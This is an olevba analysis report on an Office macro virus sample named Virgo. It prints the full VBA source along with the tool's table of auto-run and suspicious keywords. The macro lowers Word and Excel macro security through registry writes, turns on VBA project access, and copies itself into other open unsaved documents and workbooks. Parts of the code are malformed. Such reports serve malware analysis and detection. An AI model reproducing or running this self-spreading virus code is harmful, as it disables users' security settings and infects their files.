olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Virgo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSOffice.Virgo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSOffice.Virgo - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Virgo
Const regpath = "HKEY_CURRENT_USER\Software\Microsoft\Office"
Const lvl = "Level"
Const Avb = "AccessVBOM"

Private Sub Document_open()
If Application.Version = "8.0" Then End
With System
.PrivateProfileString("", regpath & "\10.0\Word\Security", lvl) = 1&
If .PrivateProfileString("", regpath & "\10.0\Word\Security", Avb) <> 1& Then
.PrivateProfileString("", regpath & "\10.0\Word\Security", Avb) = 1&
WordBasic.FileExit dlg
End If
.PrivateProfileString("", regpath & "\10.0\Excel\Security", lvl) = 1&
.PrivateProfileString("", regpath & "\10.0\Excel\Security", Avb) = 1&
.PrivateProfileString("", regpath & "\9.0\Word\Security", lvl) = 1&
.PrivateProfileString("", regpath & "\9.0\Excel", lvl) = 1&
End With
End Sub
Private Sub Workbook_open()
If Application.Version = "8.0" Then End
Set Sys = CreateObject("wscript.shell")

With Sys
.Regwrite regpath & "\10.0\Word\Security\" & lvl, 1&, "Reg_DWORD"

End With

If .PrivateProfileString("", regpath & "\10.0\Word\Security", Avb) <> 1& Then
.PrivateProfileString("", regpath & "\10.0\Word\Security", Avb) = 1&
WordBasic.FileExit dlg
End If
.PrivateProfileString("", regpath & "\10.0\Excel\Security", lvl) = 1&
.PrivateProfileString("", regpath & "\10.0\Excel\Security", Avb) = 1&
.PrivateProfileString("", regpath & "\9.0\Word\Security", lvl) = 1&
.PrivateProfileString("", regpath & "\9.0\Excel", lvl) = 1&
End With

End Sub
Private Sub document_close()
While i < Documents.Count
    i = i + 1
    If Documents(i).Saved = False Then
        With Documents(i).VBProject.vbcomponents(1).codemodule
            If .Lines(1, 1) <> "'Virgo" Then
                .DeleteLines 1, .CountOfLines
                .addfromstring mycode
            End If
        End With
    End If
Wend
On Error GoTo NextApp1
Set Xl = GetObject(Class:="Excel.Application")
While i < Xl.Workbooks.Count
    i = i + 1
    If Xl.Workbooks(i).Saved = False Then
        With Xl.Workbooks(i).VBProject.vbcomponents("ThisWorkbook").codemodule
            If .Lines(1, 1) <> "'Virgo" Then
                .DeleteLines 1, .CountOfLines
                .addfromstring mycode
            End If
        End With
    End If
Wend
NextApp1:
End Sub

Private Sub Workbook_Deactivate()
While i < Workbooks.Count
    i = i + 1
    If Workbooks(i).Saved = False Then
        With Workbooks(i).VBProject.vbcomponents("ThisWorkbook").codemodule
            If .Lines(1, 1) <> "'Virgo" Then
                .DeleteLines 1, .CountOfLines
                .addfromstring mycode
            End If
        End With
    End If
Wend
On Error GoTo NextApp1
Set Wm = GetObject(Class:="Worm.Application")
While i < Wm.Documents.Count
    i = i + 1
    If Wm.Documents(i).Saved = False Then
        With Wm.Documents(i).VBProject.vbcomponents(1).codemodule
            If .Lines(1, 1) <> "'Virgo" Then
                .DeleteLines 1, .CountOfLines
                .addfromstring mycode
            End If
        End With
    End If
Wend
NextApp1:
End Sub
Private Function mycode()
With Application.VBE.SelectedVBComponent.codemodule
    mycode = .Lines(1, .CountOfLines)
End With
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_open       |Runs when the Excel Workbook is opened       |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

